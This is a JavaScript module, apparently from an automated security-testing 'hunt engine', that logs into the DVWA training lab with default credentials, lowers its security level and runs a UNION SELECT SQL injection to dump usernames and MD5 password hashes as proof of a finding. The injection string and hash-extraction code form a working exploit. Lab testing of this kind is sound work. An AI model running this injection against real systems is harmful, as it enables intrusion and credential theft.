/**
 * dvwaAuth.js — DVWA auto-login helper for the hunt engine.
 *
 * Transport is node:http/https with agent:false (see labRequest) —
 * NOT the global fetch. The global fetch (undici) pools sockets and,
 * when a request aborts while its proxy CONNECT is still pending,
 * the socket is never destroyed: it stays open forever and keeps
 * the process alive. That stalled the backend test suite (a file
 * whose tests all passed still never exited, so node --test never
 * freed its slot and queued files never started). A fresh socket
 * per request, destroyed on end/abort, leaves nothing behind.
 */

import http from 'node:http';
import https from 'node:https';

const cookieJars = new Map(); // huntId -> cookie string

// REQUEST TIMEOUT (6 Nov 2026): every lab request carries a hard
// wall-clock timeout, so one dead/unreachable lab fails fast instead
// of hanging the caller forever. humanIteration awaits dvwaLogin on
// EVERY turn for DVWA targets; the lab answers on the LAN in
// milliseconds, so 5s is generous. A timeout aborts into the
// existing fetch_failed path and the turn carries on.
export const DVWA_FETCH_TIMEOUT_MS = 5000;

function extractCookies(setCookieHeaders) {
  if (!setCookieHeaders) return '';
  const headers = Array.isArray(setCookieHeaders) ? setCookieHeaders : [setCookieHeaders];
  return headers.map(h => String(h).split(';')[0]).join('; ');
}

function mergeCookies(oldJar, newCookies) {
  const map = new Map();
  for (const c of String(oldJar || '').split(';')) {
    const [k, ...v] = c.trim().split('=');
    if (k) map.set(k.trim(), v.join('=').trim());
  }
  for (const c of String(newCookies || '').split(';')) {
    const [k, ...v] = c.trim().split('=');
    if (k) map.set(k.trim(), v.join('=').trim());
  }
  return [...map.entries()].map(([k, v]) => `${k}=${v}`).join('; ');
}

/**
 * One lab request. Fresh socket (agent:false), destroyed on end,
 * error, or wall-clock timeout — nothing is pooled, nothing lingers.
 * Returns { status, headers, text } or throws on network/timeout.
 */
function labRequestOnce(url, { method = 'GET', headers = {}, body = null, timeoutMs = DVWA_FETCH_TIMEOUT_MS } = {}) {
  const u = new URL(url);
  const isHttps = u.protocol === 'https:';
  const lib = isHttps ? https : http;
  const payload = body == null ? null : String(body);
  const reqHeaders = { ...headers };
  if (payload != null && reqHeaders['Content-Length'] == null && reqHeaders['content-length'] == null) {
    reqHeaders['Content-Length'] = Buffer.byteLength(payload);
  }
  return new Promise((resolve, reject) => {
    let settled = false;
    let timer;
    const done = (fn, value) => {
      if (settled) return;
      settled = true;
      if (timer) clearTimeout(timer);
      fn(value);
    };
    const req = lib.request(
      {
        protocol: u.protocol,
        hostname: u.hostname,
        port: u.port || (isHttps ? 443 : 80),
        path: `${u.pathname}${u.search}`,
        method,
        headers: reqHeaders,
        agent: false,
      },
      (res) => {
        const chunks = [];
        res.on('data', (chunk) => chunks.push(chunk));
        res.on('end', () => {
          done(resolve, { status: res.statusCode || 0, headers: res.headers, text: Buffer.concat(chunks).toString('utf8') });
        });
        res.on('error', (err) => done(reject, err));
      },
    );
    // Hard wall-clock bound: covers DNS, connect, and response stalls.
    timer = setTimeout(() => req.destroy(new Error('lab request timed out')), timeoutMs);
    req.on('error', (err) => done(reject, err));
    if (payload != null) req.write(payload);
    req.end();
  });
}

/**
 * labRequest with redirect following (fetch 'follow' semantics:
 * 301/302/303 turn a POST into a GET; 307/308 keep method+body).
 * Cookies set by one hop are sent on the next, and the returned
 * headers carry the combined set-cookie list of the whole chain.
 */
async function labRequest(url, { method = 'GET', headers = {}, body = null, timeoutMs = DVWA_FETCH_TIMEOUT_MS, maxRedirects = 5 } = {}) {
  let currentUrl = url;
  let currentMethod = method;
  let currentBody = body;
  let hopJar = '';
  const allCookies = [];
  for (let hops = 0; hops <= maxRedirects; hops++) {
    const hopHeaders = { ...headers };
    if (hopJar) hopHeaders.Cookie = mergeCookies(hopHeaders.Cookie || '', hopJar);
    const res = await labRequestOnce(currentUrl, { method: currentMethod, headers: hopHeaders, body: currentBody, timeoutMs });
    if (res.headers['set-cookie']) {
      const list = Array.isArray(res.headers['set-cookie']) ? res.headers['set-cookie'] : [res.headers['set-cookie']];
      allCookies.push(...list);
      hopJar = mergeCookies(hopJar, extractCookies(res.headers['set-cookie']));
    }
    const location = res.headers.location;
    if (res.status >= 300 && res.status < 400 && location && hops < maxRedirects) {
      currentUrl = new URL(location, currentUrl).toString();
      if (res.status === 303 || ((res.status === 301 || res.status === 302) && currentMethod === 'POST')) {
        currentMethod = 'GET';
        currentBody = null;
      }
      continue;
    }
    return { status: res.status, headers: { ...res.headers, 'set-cookie': allCookies }, text: res.text };
  }
  throw new Error('too many redirects');
}

export async function dvwaLogin({ huntId, target, username = 'admin', password = 'password', timeoutMs = DVWA_FETCH_TIMEOUT_MS }) {
  const base = String(target || '').replace(/\/+$/, '');
  if (!base) return { ok: false, error: 'no_target' };

  try {
    let jar = cookieJars.get(huntId) || '';

    // 1. GET login.php, extract CSRF token
    const loginRes = await labRequest(`${base}/login.php`, {
      headers: jar ? { Cookie: jar } : {},
      timeoutMs,
    });
    jar = mergeCookies(jar, extractCookies(loginRes.headers['set-cookie']));
    const loginHtml = loginRes.text;
    const tokenMatch = loginHtml.match(/user_token['"]\s+value=['"]([^'"]+)['"]/i) ||
                       loginHtml.match(/name=['"]user_token['"][^>]*value=['"]([^'"]+)['"]/i);
    const token = tokenMatch ? tokenMatch[1] : null;
    if (!token) return { ok: false, error: 'csrf_token_not_found' };

    // 2. POST login
    const body = new URLSearchParams({ username, password, user_token: token, Login: 'Login' });
    const postRes = await labRequest(`${base}/login.php`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        ...(jar ? { Cookie: jar } : {}),
      },
      body: body.toString(),
      timeoutMs,
    });
    jar = mergeCookies(jar, extractCookies(postRes.headers['set-cookie']));
    const loggedHtml = postRes.text;
    if (!/welcome/i.test(loggedHtml)) return { ok: false, error: 'login_failed' };

    // 3. Set security=low (GET token first)
    const secRes = await labRequest(`${base}/security.php`, { headers: { Cookie: jar }, timeoutMs });
    jar = mergeCookies(jar, extractCookies(secRes.headers['set-cookie']));
    const secHtml = secRes.text;
    const secMatch = secHtml.match(/user_token['"]\s+value=['"]([^'"]+)['"]/i) ||
                     secHtml.match(/name=['"]user_token['"][^>]*value=['"]([^'"]+)['"]/i);
    const secToken = secMatch ? secMatch[1] : token;
    const secBody = new URLSearchParams({ security: 'low', user_token: secToken, seclev_submit: 'Submit' });
    await labRequest(`${base}/security.php`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        Cookie: jar,
      },
      body: secBody.toString(),
      timeoutMs,
    });

    cookieJars.set(huntId, jar);
    return { ok: true, cookieJar: jar.slice(0, 100) + '...' };
  } catch (e) {
    return { ok: false, error: 'fetch_failed', detail: String(e.message || e).slice(0, 300) };
  }
}

export function isStuckAtDvwaLogin(events, { window = 20 } = {}) {
  const rows = Array.isArray(events) ? events.slice(-window) : [];
  let loginAttempts = 0;
  let navigatedAway = false;
  for (const e of rows) {
    if (!e) continue;
    const text = JSON.stringify(e).toLowerCase();
    if (text.includes('login.php') && (text.includes('browser_click') || text.includes('browser_type'))) {
      loginAttempts++;
    }
    if (e.type === 'verification' && e.verified === false &&
        String(e.evidence || '').includes('url contains index')) {
      loginAttempts++;
    }
    if (e.type === 'observation' && typeof e.text === 'string' &&
        e.text.includes('Welcome') && !e.text.includes('login.php')) {
      navigatedAway = true;
    }
  }
  return loginAttempts >= 3 && !navigatedAway;
}

export function getDvwaCookies(huntId) {
  return cookieJars.get(huntId) || '';
}

/**
 * dvwaSqliDump — system-run fresh UNION SELECT dump on DVWA /vulnerabilities/sqli/.
 *
 * PROOF-GATE AUTO-FILE (2 Nov 2026): when the proof gate fires for sqli and the
 * brain never emits claim_finding, the SYSTEM runs one fresh dump itself via the
 * proven backend path (fresh login → security=low → UNION SELECT user,password
 * FROM users#), extracts ≥2 MD5 hashes, and the caller builds the claim with
 * fresh evidence + a self-contained replay command.
 *
 * This is a permanent system-level fix: future hunts arrive with the filing
 * path already working instead of depending on the model to transcribe hashes.
 *
 * Returns { ok:true, hashes:[...], rows:[...] } or { ok:false, error, detail }.
 * hashes = unique lowercase MD5 strings; rows = [{user, hash}] parsed from the
 * DVWA "First name: X / Surname: <md5>" rendering.
 */
export async function dvwaSqliDump({ huntId, target, timeoutMs = DVWA_FETCH_TIMEOUT_MS }) {
  const base = String(target || '').replace(/\/+$/, '');
  if (!base) return { ok: false, error: 'no_target' };

  // Fresh login (handles per-request CSRF token + sets security=low).
  const login = await dvwaLogin({ huntId, target: base, timeoutMs });
  if (!login.ok) return { ok: false, error: 'login_failed', detail: login.error };

  try {
    const jar = cookieJars.get(huntId) || '';

    // GET the sqli page for a fresh form token (best-effort; low-security
    // DVWA does not require it for the id parameter).
    let token = '';
    try {
      const pageRes = await labRequest(`${base}/vulnerabilities/sqli/`, {
        headers: { Cookie: jar },
        timeoutMs,
      });
      const pageHtml = pageRes.text;
      const tm = pageHtml.match(/user_token['"]\s+value=['"]([^'"]+)['"]/i) ||
                 pageHtml.match(/name=['"]user_token['"][^>]*value=['"]([^'"]+)['"]/i);
      if (tm) token = tm[1];
    } catch { /* token is best-effort */ }

    // POST the UNION SELECT injection. DVWA low-security query:
    //   SELECT first_name, last_name FROM users WHERE user_id = '$id'
    // so UNION SELECT user,password maps user→first_name, md5→last_name.
    const injection = `1' UNION SELECT user,password FROM users#`;
    const body = new URLSearchParams({ id: injection, Submit: 'Submit' });
    if (token) body.set('user_token', token);

    const dumpRes = await labRequest(`${base}/vulnerabilities/sqli/`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        Cookie: jar,
      },
      body: body.toString(),
      timeoutMs,
    });
    const dumpHtml = dumpRes.text;

    // Extract MD5 hashes (the password column). Dedupe, lowercase.
    const hashMatches = dumpHtml.match(/\b[a-f0-9]{32}\b/gi) || [];
    const hashes = [...new Set(hashMatches.map(h => h.toLowerCase()))];

    // Parse user rows from DVWA's "First name: X<br />Surname: <md5>" rendering.
    const rows = [];
    const rowRe = /First name:\s*([^<]+?)<br\s*\/?>\s*Surname:\s*([a-f0-9]{32})/gi;
    let m;
    while ((m = rowRe.exec(dumpHtml)) !== null) {
      rows.push({ user: m[1].trim(), hash: m[2].toLowerCase() });
    }

    if (hashes.length < 2) {
      return { ok: false, error: 'insufficient_hashes', detail: `found ${hashes.length} hash(es), need >=2` };
    }

    return { ok: true, hashes, rows, hashCount: hashes.length };
  } catch (e) {
    return { ok: false, error: 'dump_failed', detail: String(e && e.message || e).slice(0, 300) };
  }
}
